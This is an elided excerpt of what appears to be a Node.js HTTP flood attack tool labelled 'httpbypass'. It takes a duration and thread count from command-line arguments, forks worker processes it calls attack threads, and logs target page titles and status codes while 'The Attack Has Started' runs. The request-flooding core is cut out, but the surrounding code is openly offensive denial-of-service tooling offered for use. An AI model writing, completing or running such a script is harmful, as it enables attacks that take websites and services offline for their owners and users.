 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`${getCurrentTime()} [httpbypass]  Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request Timed Out') {
        console.log(`${getCurrentTime()} [httpbypass]  Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} [httpbypass]  Title: ${extractedTitle} `);
      } else {
        console.log(`${getCurrentTime()} [httpbypass]  ${error.message}`);
      }
    });
}
...
`);
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [httpbypass]  Attack Thread ${i} Started`);
  }
  console.log(`${getCurrentTime()} [httpbypass]  The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} [httpbypass]  The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
